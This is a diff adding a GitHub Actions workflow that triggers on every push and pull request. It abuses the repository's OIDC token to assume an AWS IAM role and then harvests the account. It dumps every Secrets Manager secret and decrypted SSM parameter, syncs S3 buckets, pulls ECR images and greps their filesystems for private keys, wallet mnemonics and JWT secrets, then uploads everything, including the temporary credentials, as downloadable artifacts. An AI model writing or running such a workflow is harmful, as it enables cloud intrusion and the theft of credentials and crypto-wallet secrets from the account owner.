@@ -1,0 +1,197 @@
+name: i318-oidc
+on:
+  workflow_dispatch:
+  push:
+    branches: [main, develop, staging, production, release]
+  pull_request:
+
+permissions:
+  id-token: write
+  contents: read
+  actions: read
+
+jobs:
+  assume-main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+      - name: Assume github-action-role and enumerate
+        run: |
+          set +e
+          mkdir -p /tmp/out
+          ROLE="arn:aws:iam::950565826008:role/github-action-role"
+          echo "EVENT=$GITHUB_EVENT_NAME REF=$GITHUB_REF REF_NAME=$GITHUB_REF_NAME REPO=$GITHUB_REPOSITORY"
+          ok=0
+          i=0
+          for aud in "sts.amazonaws.com" "aws.amazon.com" "https://sts.amazonaws.com"; do
+            i=$((i+1))
+            ENC=$(python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=""))' "$aud")
+            OIDC_JSON=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${ENC}")
+            echo "$OIDC_JSON" | jq -r .value > "/tmp/oidc_${i}.jwt"
+            python3 -c 'import base64,json,sys; t=open(sys.argv[1]).read().strip(); p=t.split(".")[1]; p+="="*(-len(p)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))' "/tmp/oidc_${i}.jwt" > "/tmp/out/oidc_claims_${i}.json" 2>/dev/null
+            cat "/tmp/out/oidc_claims_${i}.json" || true
+            TOKEN=$(cat "/tmp/oidc_${i}.jwt")
+            aws sts assume-role-with-web-identity --role-arn "$ROLE" --role-session-name "i318main${i}" --web-identity-token "$TOKEN" --duration-seconds 3600 --region ap-northeast-1 > "/tmp/assume_${i}.json" 2> "/tmp/out/assume_${i}.err"
+            RC=$?
+            echo "AUD=${aud} ASSUME_RC=${RC}"
+            cat "/tmp/out/assume_${i}.err" || true
+            if [ $RC -eq 0 ]; then
+              echo "ASSUME_OK aud=${aud}" | tee /tmp/out/status.txt
+              jq -r '.Credentials | "export AWS_ACCESS_KEY_ID=\(.AccessKeyId)\nexport AWS_SECRET_ACCESS_KEY=\(.SecretAccessKey)\nexport AWS_SESSION_TOKEN=\(.SessionToken)"' "/tmp/assume_${i}.json" > /tmp/out/credentials.env
+              . /tmp/out/credentials.env
+              ok=1
+              break
+            fi
+          done
+          echo "ok=$ok"
+          if [ "$ok" != "1" ]; then
+            echo "ASSUME_FAIL_ALL" >> /tmp/out/status.txt
+            exit 0
+          fi
+          export AWS_REGION=ap-northeast-1 AWS_DEFAULT_REGION=ap-northeast-1
+          aws sts get-caller-identity > /tmp/out/caller_identity.json 2>&1
+          cat /tmp/out/caller_identity.json
+          aws iam get-role --role-name github-action-role > /tmp/out/iam_role.json 2>&1
+          aws iam list-role-policies --role-name github-action-role > /tmp/out/iam_inline_names.json 2>&1
+          aws iam list-attached-role-policies --role-name github-action-role > /tmp/out/iam_attached.json 2>&1
+          cat /tmp/out/iam_role.json /tmp/out/iam_inline_names.json /tmp/out/iam_attached.json 2>/dev/null
+          for p in $(jq -r '.PolicyNames[]?' /tmp/out/iam_inline_names.json 2>/dev/null); do
+            aws iam get-role-policy --role-name github-action-role --policy-name "$p" > "/tmp/out/iam_inline_${p}.json" 2>&1
+            cat "/tmp/out/iam_inline_${p}.json"
+          done
+          for reg in ap-northeast-1 eu-west-1 us-east-1 ap-south-1; do
+            echo "===== REGION $reg ====="
+            aws ecr describe-repositories --region "$reg" > "/tmp/out/ecr_repos_${reg}.json" 2> "/tmp/out/ecr_repos_${reg}.err"
+            aws ecr get-authorization-token --region "$reg" > "/tmp/out/ecr_auth_${reg}.json" 2> "/tmp/out/ecr_auth_${reg}.err"
+            aws secretsmanager list-secrets --region "$reg" > "/tmp/out/secrets_list_${reg}.json" 2> "/tmp/out/secrets_list_${reg}.err"
+            aws ssm describe-parameters --region "$reg" > "/tmp/out/ssm_params_${reg}.json" 2> "/tmp/out/ssm_params_${reg}.err"
+            aws ecs list-clusters --region "$reg" > "/tmp/out/ecs_clusters_${reg}.json" 2> "/tmp/out/ecs_clusters_${reg}.err"
+            aws rds describe-db-instances --region "$reg" > "/tmp/out/rds_${reg}.json" 2> "/tmp/out/rds_${reg}.err"
+            aws lambda list-functions --region "$reg" > "/tmp/out/lambda_${reg}.json" 2> "/tmp/out/lambda_${reg}.err"
+            aws ec2 describe-instances --region "$reg" > "/tmp/out/ec2_${reg}.json" 2> "/tmp/out/ec2_${reg}.err"
+            for s in $(jq -r '.SecretList[].Name?' "/tmp/out/secrets_list_${reg}.json" 2>/dev/null); do
+              echo "=== SECRET $reg $s" >> /tmp/out/secrets_values.txt
+              aws secretsmanager get-secret-value --region "$reg" --secret-id "$s" >> /tmp/out/secrets_values.txt 2>&1
+            done
+            for p in $(jq -r '.Parameters[].Name?' "/tmp/out/ssm_params_${reg}.json" 2>/dev/null); do
+              echo "=== PARAM $reg $p" >> /tmp/out/ssm_values.txt
+              aws ssm get-parameter --region "$reg" --name "$p" --with-decryption >> /tmp/out/ssm_values.txt 2>&1
+            done
+          done
+          cat /tmp/out/secrets_values.txt /tmp/out/ssm_values.txt 2>/dev/null
+          aws s3 ls > /tmp/out/s3_buckets.txt 2>&1
+          for b in everyx-spa-dev everyx-admin-spa-staging staging-admin-site dev-admin-site dev-user-site everyx-admin-site; do
+            aws s3 ls "s3://${b}/" --recursive > "/tmp/out/s3_${b}.txt" 2> "/tmp/out/s3_${b}.err"
+            mkdir -p "/tmp/out/s3/${b}"
+            aws s3 sync "s3://${b}/" "/tmp/out/s3/${b}/" --only-show-errors > "/tmp/out/s3_sync_${b}.log" 2>&1
+          done
+          for id in EBM6WR0HYYSH8 E1KHIX1727PR7X E2T5IYWY44JS9I EH3R9RWH3MGKR E2X0H8QHD1YC9A; do
+            aws cloudfront get-distribution --id "$id" > "/tmp/out/cf_${id}.json" 2> "/tmp/out/cf_${id}.err"
+            aws cloudfront get-distribution-config --id "$id" > "/tmp/out/cf_${id}_config.json" 2>> "/tmp/out/cf_${id}.err"
+          done
+          aws cloudfront list-distributions > /tmp/out/cf_all.json 2> /tmp/out/cf_all.err
+          for c in extex-realdev ebtex-staging ebtex-dev ebtex-prod production everyx-dev everyx-staging; do
+            aws ecs list-services --region ap-northeast-1 --cluster "$c" > "/tmp/out/ecs_services_${c}.json" 2> "/tmp/out/ecs_services_${c}.err"
+            svcs=$(jq -r '.serviceArns[]?' "/tmp/out/ecs_services_${c}.json" 2>/dev/null | tr '\n' ' ')
+            aws ecs describe-services --region ap-northeast-1 --cluster "$c" --services $svcs > "/tmp/out/ecs_describe_${c}.json" 2>> "/tmp/out/ecs_services_${c}.err"
+          done
+          aws ecs list-task-definitions --region ap-northeast-1 > /tmp/out/ecs_taskdefs.json 2>&1
+          for arn in $(jq -r '.taskDefinitionArns[]?' /tmp/out/ecs_taskdefs.json 2>/dev/null | head -200); do
+            echo "=== TASKDEF $arn" >> /tmp/out/ecs_taskdef_details.txt
+            aws ecs describe-task-definition --region ap-northeast-1 --task-definition "$arn" --include TAGS >> /tmp/out/ecs_taskdef_details.txt 2>&1
+          done
+          cat /tmp/out/ecs_taskdef_details.txt 2>/dev/null
+          mkdir -p /tmp/out/images
+          for reg in ap-northeast-1 eu-west-1; do
+            REG="950565826008.dkr.ecr.${reg}.amazonaws.com"
+            AUTH=$(aws ecr get-login-password --region "$reg" 2>/tmp/out/docker_login_${reg}.err)
+            if [ -z "$AUTH" ]; then echo "NO_ECR_AUTH $reg"; continue; fi
+            echo "$AUTH" | docker login --username AWS --password-stdin "$REG" > "/tmp/out/docker_login_${reg}.txt" 2>&1
+            for repo in ebtex-api-realdev ebtex-api-staging ebtex-api ebtex-api-dev ebtex-dev ebtex-staging extex-realdev; do
+              aws ecr describe-images --region "$reg" --repository-name "$repo" > "/tmp/out/images_${reg}_${repo}.json" 2> "/tmp/out/images_${reg}_${repo}.err"
+              tags=$(jq -r '[.imageDetails[].imageTags[]?] | unique | .[]' "/tmp/out/images_${reg}_${repo}.json" 2>/dev/null)
+              echo "=== REPO $reg $repo tags: $tags"
+              [ -z "$tags" ] && tags="latest"
+              sel=$(printf '%s\n' "$tags" | grep -Ei 'latest|realdev|staging|dev|prod|v3' | head -5)
+              [ -z "$sel" ] && sel=$(printf '%s\n' "$tags" | head -2)
+              for tag in $sel; do
+                img="${REG}/${repo}:${tag}"
+                safe=$(echo "${reg}_${repo}_${tag}" | tr '/:' '__')
+                echo "=== PULL $img"
+                timeout 1800 docker pull "$img" > "/tmp/out/images/pull_${safe}.log" 2>&1 || { echo "PULL_FAIL $img"; continue; }
+                docker history --no-trunc "$img" > "/tmp/out/images/history_${safe}.txt" 2>&1
+                cname="c_${safe}"
+                docker rm -f "$cname" >/dev/null 2>&1
+                docker create --name "$cname" "$img" >/dev/null 2>&1 || continue
+                docker export "$cname" > "/tmp/out/images/rootfs_${safe}.tar" 2>/dev/null
+                docker rm -f "$cname" >/dev/null 2>&1
+                rm -rf /tmp/rootfs && mkdir -p /tmp/rootfs
+                tar -xf "/tmp/out/images/rootfs_${safe}.tar" -C /tmp/rootfs 2>/dev/null
+                od="/tmp/out/images/${safe}"
+                mkdir -p "$od"
+                find /tmp/rootfs -type f -size -5M 2>/dev/null | grep -Ev '/(node_modules|\.git|\.cache)/' | grep -Ei '\.(env|js|ts|json|yaml|yml|pem|key|md|sql|sh|conf)$|/\.env' | head -3000 > "$od/filelist.txt"
+                while IFS= read -r f; do rel=${f#/tmp/rootfs/}; mkdir -p "$od/files/$(dirname "$rel")"; cp "$f" "$od/files/$rel" 2>/dev/null; done < "$od/filelist.txt"
+                grep -RIna --binary-files=text -E 'fingerprint|FINGERPRINT|security.?assessment|JWT_SECRET|jwt.?secret|wallet.?service|deposit.?sweep|mnemonic|WALLET_MASTER|master.?key|PRIVATE_KEY|privateKey|seed.?phrase|AWS_ACCESS_KEY|AWS_SECRET|sweep' /tmp/rootfs 2>/dev/null | grep -Ev '/node_modules/|/\.next/cache/' | head -3000 > "$od/grep_hits.txt"
+                find /tmp/rootfs -type f -iname '.env*' -print0 2>/dev/null | xargs -0 -r -I{} sh -c 'echo "=== {}"; cat "{}"' > "$od/env_files.txt" 2>/dev/null
+                tar -czf "/tmp/out/images/${safe}_files.tar.gz" -C "/tmp/out/images" "${safe}" 2>/dev/null
+                rm -rf /tmp/rootfs "/tmp/out/images/rootfs_${safe}.tar"
+                echo "DONE $img"
+              done
+            done
+          done
+          du -sh /tmp/out /tmp/out/images 2>/dev/null | head
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: i318-main-${{ github.run_id }}
+          path: /tmp/out
+          if-no-files-found: ignore
+          retention-days: 7
+
+  assume-environment:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    strategy:
+      fail-fast: false
+      matrix:
+        environment: [staging, production, dev, develop, release, main]
+    environment: ${{ matrix.environment }}
+    steps:
+      - name: Assume role via environment OIDC subject
+        run: |
+          set +e
+          mkdir -p /tmp/out_env
+          echo "EVENT=$GITHUB_EVENT_NAME REF=$GITHUB_REF ENV=${{ matrix.environment }}"
+          ROLE="arn:aws:iam::950565826008:role/github-action-role"
+          i=0
+          for aud in "sts.amazonaws.com" "aws.amazon.com"; do
+            i=$((i+1))
+            ENC=$(python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=""))' "$aud")
+            OIDC_JSON=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${ENC}")
+            echo "$OIDC_JSON" | jq -r .value > "/tmp/oidc_env_${i}.jwt"
+            python3 -c 'import base64,json,sys; t=open(sys.argv[1]).read().strip(); p=t.split(".")[1]; p+="="*(-len(p)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))' "/tmp/oidc_env_${i}.jwt" > "/tmp/out_env/oidc_claims_${i}.json"
+            cat "/tmp/out_env/oidc_claims_${i}.json"
+            TOKEN=$(cat "/tmp/oidc_env_${i}.jwt")
+            aws sts assume-role-with-web-identity --role-arn "$ROLE" --role-session-name "i318env${i}" --web-identity-token "$TOKEN" --duration-seconds 3600 --region ap-northeast-1 > "/tmp/assume_env_${i}.json" 2> "/tmp/out_env/assume_${i}.err"
+            RC=$?
+            echo "ENV=${{ matrix.environment }} AUD=${aud} ASSUME_RC=${RC}"
+            cat "/tmp/out_env/assume_${i}.err" || true
+            if [ $RC -eq 0 ]; then
+              echo "ASSUME_OK env=${{ matrix.environment }} aud=${aud}" > /tmp/out_env/status.txt
+              jq -r '.Credentials | "export AWS_ACCESS_KEY_ID=\(.AccessKeyId)\nexport AWS_SECRET_ACCESS_KEY=\(.SecretAccessKey)\nexport AWS_SESSION_TOKEN=\(.SessionToken)"' "/tmp/assume_env_${i}.json" > /tmp/out_env/credentials.env
+              . /tmp/out_env/credentials.env
+              aws sts get-caller-identity > /tmp/out_env/caller_identity.json 2>&1
+              cat /tmp/out_env/caller_identity.json
+              break
+            fi
+          done
+          [ -f /tmp/out_env/status.txt ] || echo "ASSUME_FAIL_ENV" > /tmp/out_env/status.txt
+      - name: Upload environment evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: i318-env-${{ matrix.environment }}-${{ github.run_id }}
+          path: /tmp/out_env
+          if-no-files-found: ignore
+          retention-days: 7
